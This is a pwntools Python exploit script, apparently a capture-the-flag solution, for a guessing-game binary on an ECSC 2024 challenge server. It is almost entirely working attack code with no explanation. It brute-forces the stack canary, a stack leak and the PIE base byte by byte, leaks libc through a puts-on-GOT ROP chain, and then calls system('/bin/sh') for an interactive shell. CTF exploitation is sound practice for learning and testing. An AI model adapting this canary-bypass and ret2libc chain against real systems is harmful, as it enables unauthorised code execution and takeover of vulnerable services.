#!/usr/bin/env python3

from pwn import *

elf = ELF("./yet_another_guessing_game_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("yetanotherguessinggame.challs.open.ecsc2024.it", 38021)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                breakrva 0x13BB
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    known = b''
    skip = b'a'*16
    for _ in range(0x18):
        for guess in reversed(range(256)):
            r.sendafter(b'Guess the secret!\n', (skip + b'a'*len(known) + bytes([guess])).ljust(40, b'\x00') + skip + b'a'*len(known))
            out = r.recvline()
            r.sendafter(b'Wanna play again? (y/n)\n', b'y')
            if b'win!' in out:
                known += bytes([guess])
                break

        print(known.hex())

    canary = u64(known[0:8])
    stack_leak = u64(known[8:16])
    elf.address = u64(known[16:24]) - (elf.sym.main+198)

    log.success(f"Canary: {hex(canary)}")
    log.success(f"Stack: {hex(stack_leak)}")
    log.success(f"PIE base: {hex(elf.address)}")

    payload = flat([
        canary,
        stack_leak,
        elf.address + 0x1503,   # pop rdi; ret;
        elf.got['read'],        # read@GOT
        elf.plt['puts'],        # puts@plt
        elf.sym.game            # game
    ])
    r.sendafter(b'Guess the secret!\n', b'a'*56+payload)
    r.sendafter(b'Wanna play again? (y/n)\n', b'n')
    r.recvuntil(b'Goodbye!\n')

    libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym.read
    log.success(f"Libc base: {hex(libc.address)}")

    payload = flat([
            canary,
            stack_leak,
            elf.address + 0x1503,   # pop rdi; ret;
            next(libc.search(b"/bin/sh\x00")),
            elf.address + 0x101a,   # ret
            libc.sym.system         # system@GLIBC
        ])

    r.sendafter(b'Guess the secret!\n', b'a'*56+payload)
    r.sendafter(b'Wanna play again? (y/n)\n', b'n')
    r.interactive()


if __name__ == "__main__":
    main()
